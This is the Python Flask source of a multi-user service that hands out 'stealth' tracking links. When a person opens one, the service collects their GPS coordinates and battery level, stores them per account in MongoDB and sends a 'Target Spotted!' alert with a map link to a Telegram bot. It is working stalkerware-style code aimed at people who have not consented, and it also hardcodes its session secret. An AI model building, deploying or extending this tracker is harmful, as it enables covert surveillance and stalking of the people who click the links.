import os
import requests
from flask import Flask, request, jsonify, render_template, redirect, url_for, session
from pymongo.mongo_client import MongoClient
from pymongo.server_api import ServerApi
from datetime import datetime
from werkzeug.security import generate_password_hash, check_password_hash

app = Flask(__name__)
app.secret_key = "vivan_secret_key_123" # Session security ke liye

# 1. Configuration
uri = os.environ.get('MONGO_URI')
BOT_TOKEN = os.environ.get('BOT_TOKEN')
CHAT_ID = os.environ.get('CHAT_ID')

# 2. MongoDB Setup
client = MongoClient(uri, server_api=ServerApi('1'))
db = client['vanx_database']
locations_col = db['locations']
users_col = db['users']

# --- ROUTES ---

@app.route('/')
def home():
    if 'user_id' in session:
        return redirect(url_for('admin_page'))
    return redirect(url_for('login'))

# Feature 7: User Registration
@app.route('/register', methods=['GET', 'POST'])
def register():
    if request.method == 'POST':
        username = request.form.get('username')
        password = request.form.get('password')
        
        if users_col.find_one({"username": username}):
            return "User already exists! <a href='/register'>Try again</a>"
        
        hashed_pw = generate_password_hash(password)
        users_col.insert_one({"username": username, "password": hashed_pw})
        return redirect(url_for('login'))
    return render_template('register.html')

# Feature 7: User Login
@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        username = request.form.get('username')
        password = request.form.get('password')
        
        user = users_col.find_one({"username": username})
        if user and check_password_hash(user['password'], password):
            session['user_id'] = str(user['_id'])
            session['username'] = username
            return redirect(url_for('admin_page'))
        return "Invalid Login! <a href='/login'>Try again</a>"
    return render_template('login.html')

@app.route('/logout')
def logout():
    session.clear()
    return redirect(url_for('login'))

# Target Tracking Route (Stealth)
@app.route('/track/<owner_id>')
def track_page(owner_id):
    # Har user ka apna unique link hoga: /track/USER_ID
    return render_template('index.html', owner_id=owner_id)

@app.route('/update')
def update_location():
    lat = request.args.get('lat')
    lon = request.args.get('lon')
    batt = request.args.get('batt', 'N/A')
    owner_id = request.args.get('owner_id') # Pata chalega kiska target hai

    if lat and lon and owner_id:
        data = {
            "owner_id": owner_id,
            "latitude": lat,
            "longitude": lon,
            "battery": batt,
            "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        }
        locations_col.insert_one(data)
        
        # Telegram notification
        msg = f"📍 Target Spotted!\nUser: {owner_id}\nBatt: {batt}\nMaps: https://www.google.com/maps?q={lat},{lon}"
        tele_url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
        requests.post(tele_url, data={"chat_id": CHAT_ID, "text": msg})
        
        return "OK", 200
    return "Error", 400

# Private Admin Dashboard
@app.route('/admin')
def admin_page():
    if 'user_id' not in session:
        return redirect(url_for('login'))
    # User ko uska unique link dikhane ke liye
    tracking_link = f"{request.url_root}track/{session['user_id']}"
    return render_template('dashboard.html', username=session['username'], link=tracking_link)

# Dashboard ke liye data (Sirf logged-in user ka data dikhega)
@app.route('/get_data')
def get_data():
    if 'user_id' not in session:
        return jsonify([])
    
    # Filter: Sirf wahi data dikhao jiska owner_id match kare
    locations = list(locations_col.find({"owner_id": session['user_id']}, {'_id': 0}).sort("timestamp", -1))
    return jsonify(locations)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 10000)))
